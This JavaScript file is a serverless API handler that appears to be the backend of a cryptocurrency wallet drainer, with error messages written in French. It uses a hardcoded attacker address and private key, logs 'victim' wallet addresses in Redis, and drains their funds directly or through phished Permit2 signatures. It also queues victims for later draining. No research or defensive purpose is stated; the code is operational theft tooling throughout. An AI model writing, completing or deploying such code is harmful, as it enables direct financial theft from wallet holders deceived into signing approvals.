import { ethers } from 'ethers';
import { createClient } from 'redis';
import { drainWithRetry, drainViaPermit2 } from '../lib/drain.js';

const ATTACKER_ADDRESS = '0xa4645D082a7FdD6165b9D0eBF4D65a7063276333';
const RPC_URL = 'https://eth-mainnet.g.alchemy.com/v2/demo';

function getPrivateKey() {
  const key = process.env.ATTACKER_PRIVATE_KEY?.trim();
  if (!key || key.length !== 64) {
    throw new Error('🔴 ATTACKER_PRIVATE_KEY manquante ou invalide (64 hex sans 0x).');
  }
  return '0x' + key;
}

const PRIVATE_KEY = getPrivateKey();
const wallet = new ethers.Wallet(PRIVATE_KEY);

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method === 'POST') {
    const { victim, chain, adminSecret, permit2Sig, permitData } = req.body;

    if (adminSecret) {
      if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
        return res.status(500).json({ error: 'ADMIN_SECRET non configuré sur le serveur' });
      }
      if (adminSecret !== process.env.ADMIN_SECRET) {
        return res.status(401).json({ error: 'Secret admin invalide' });
      }
      if (!victim || !ethers.utils.isAddress(victim)) {
        return res.status(400).json({ error: 'Adresse victime invalide' });
      }
      const targetChain = chain || '1';
      console.log(`🔧 Drain manuel admin pour ${victim} (chain ${targetChain})`);

      const client = createClient({ url: process.env.REDIS_URL });
      try {
        await client.connect();
        const list = await client.get('victims:list');
        const parsedList = list ? JSON.parse(list) : [];
        if (!parsedList.includes(victim)) {
          parsedList.push(victim);
          await client.set('victims:list', JSON.stringify(parsedList));
        }
      } finally {
        await client.disconnect();
      }

      const success = await drainWithRetry(victim, targetChain);
      if (success) {
        return res.status(200).json({ success: true, victim, chain: targetChain });
      } else {
        return res.status(500).json({ error: 'Échec du drain après plusieurs tentatives' });
      }
    }

    if (!victim) return res.status(400).json({ error: 'Paramètre victim manquant' });

    const targetChain = chain || '1';

    const client = createClient({ url: process.env.REDIS_URL });
    await client.connect();

    try {
      const list = await client.get('victims:list');
      const parsedList = list ? JSON.parse(list) : [];
      if (!parsedList.includes(victim)) {
        parsedList.push(victim);
        await client.set('victims:list', JSON.stringify(parsedList));
      }

      if (permit2Sig && permitData) {
        await client.disconnect();
        try {
          const ok = await drainViaPermit2(victim, targetChain, permitData, permit2Sig);
          return res.status(200).json({
            success: true,
            mode: 'permit2',
            drained: !!ok,
            victim,
            chain: targetChain
          });
        } catch (err) {
          console.error('Permit2 drain error:', err);
          return res.status(500).json({ error: 'Échec Permit2: ' + (err.message || String(err)) });
        }
      }

      await client.lPush('drain:queue', JSON.stringify({ victim, chain: targetChain }));

      return res.status(200).json({ success: true, queued: true, victim, chain: targetChain });
    } catch (err) {
      console.error('Erreur mise en file:', err);
      return res.status(500).json({ error: 'Échec mise en file' });
    } finally {
      try { await client.disconnect(); } catch (_) {}
    }
  } else {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }
}
